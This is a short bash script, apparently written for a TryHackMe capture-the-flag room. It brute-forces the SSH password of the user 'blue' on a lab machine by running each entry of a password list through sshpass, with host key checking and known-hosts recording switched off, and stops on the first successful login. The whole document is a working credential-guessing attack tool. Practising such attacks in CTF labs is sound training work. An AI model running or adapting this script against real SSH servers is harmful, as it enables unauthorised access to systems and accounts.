#!/usr/bin/env bash
# Find current blue password
cd /media/gabi/Data/CTF/THM/red
for pwd in $(cat content/passlist_clean.txt); do
  result=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 -o NumberOfPasswordPrompts=1 blue@10.64.146.176 'echo SUCCESS' 2>&1)
  if echo "$result" | grep -q "SUCCESS"; then
    echo "FOUND blue pw: $pwd"
    exit 0
  fi
done
echo "Not found - rotation may have happened mid-run, try again"